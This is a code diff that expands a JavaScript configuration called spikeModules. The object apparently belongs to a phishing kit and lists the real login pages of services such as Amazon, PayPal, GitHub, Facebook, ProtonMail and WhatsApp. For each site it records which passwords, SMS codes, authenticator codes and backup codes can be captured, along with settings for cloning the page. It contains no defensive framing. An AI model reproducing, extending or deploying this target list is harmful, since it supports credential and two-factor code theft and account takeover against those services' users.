@@ -1,24 +1,179 @@
 const spikeModules = {
-    gmail: {
-        description: "email | password | 2FA.",
+    adobe: {
+        description: "username | password | authentication devices | email code | sms code | resend code | authenticator app.",
         url: {
-            desktop: "https://mail.google.com/",
+            desktop: "https://account.adobe.com/",
+        },
+        removeAllJs: true,
+        baseURI: "https://auth.services.adobe.com",
+    },
+    airtel: {
+        description: "phone | sms code | resend code.",
+        url: {
+            desktop: "https://www.airtel.in/manage-account/login",
         },
         removeAllJs: true,
         // baseURI: "",
     },
-    outlook: {
-        description: "email | password | 2FA.",
+    ajio: {
+        description: "phone | sms code | resend code.",
         url: {
-            desktop: "https://outlook.live.com/",
+            desktop: "https://www.ajio.com/login",
         },
         removeAllJs: true,
         // baseURI: "",
     },
-    yahoo: {
-        description: "email | password | 2FA.",
+    amazon: {
+        description: "phone | email | password | sms code | resend code | authentication device | forget password.",
         url: {
-            desktop: "https://login.yahoo.com/",
+            desktop: "https://www.amazon.com/gp/sign-in.html"
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    amazon_prime: {
+        description: "phone | email | password | sms code | resend code | authentication device | forget password.",
+        url: {
+            desktop: "https://www.primevideo.com/signup",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    deviantart: {
+        description: "username | password.",
+        url: {
+            desktop: "https://www.deviantart.com/users/login",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    discord: {
+        description: "email | password | code.",
+        url: {
+            desktop: "https://discord.com/login",
+        },
+        removeAllJs: true,
+        baseURI: "https://discord.com",
+    },
+    facebook: {
+        description: "email | password | sms code.",
+        url: {
+            desktop: "https://www.facebook.com/",
+            phone: "https://m.facebook.com/"
+        },
+        removeAllJs: true,
+    },
+    github: {
+        description: "email | password | sms code | resend code.",
+        url: {
+            desktop: "https://github.com/login",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    google: {
+        description: "waiting for google's new ui.",
+        url: {
+            desktop: "https://accounts.google.com",
+        },
+        removeAllJs: true,
+        ua: "Chrome",
+        // baseURI: "",
+    },
+    godaddy: {
+        description: "email | password - only.",
+        url: {
+            desktop: "https://sso.godaddy.com/"
+        },
+        removeAllJs: true,
+        ua: "Chrome",
+        // baseURI: "",
+    },
+    hackerone: {
+        description: "email | password | auth code.",
+        url: {
+            desktop: "https://hackerone.com/users/sign_in",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    instagram: {
+        description: "username | password | sms code | resend code | backup codes.",
+        url: {
+            desktop: "https://www.instagram.com/",
+        },
+        removeAllJs: true,
+        baseURI: "/web_public/instagram",
+    },
+    linkedin: {
+        description: "email | password | sms code | resend code.",
+        url: {
+            desktop: "https://www.linkedin.com/",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    mediafire: {
+        description: "email | password.",
+        url: {
+            desktop: "https://www.mediafire.com/login/",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    mega: {
+        description: "email | password | auth code.",
+        url: {
+            desktop: "https://mega.nz/login",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    microsoft: {
+        description: "*, i'm not sure.",
+        url: {
+            desktop: "https://login.microsoftonline.com",
+        },
+        removeAllJs: true,
+        grabCSS: true,
+        // baseURI: "",
+    },
+    netflix: {
+        description: "email | password.",
+        url: {
+            desktop: "https://www.netflix.com/login",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    originpc: {
+        description: "email | password.",
+        url: {
+            desktop: "https://www.originpc.com/account/login/",
+        },
+        removeAllJs: true,
+        baseURI: "https://www.originpc.com",
+    },
+    paypal: {
+        description: "email | password | auth code.",
+        url: {
+            desktop: "https://www.paypal.com/signin",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    protonmail: {
+        description: "email | password | auth code | backup codes.",
+        url: {
+            desktop: "https://account.proton.me/mail",
+        },
+        removeAllJs: true,
+        // baseURI: "",
+    },
+    whatsapp: {
+        description: "scan qrcode.",
+        url: {
+            desktop: "https://web.whatsapp.com/",
         },
         removeAllJs: true,
         // baseURI: "",
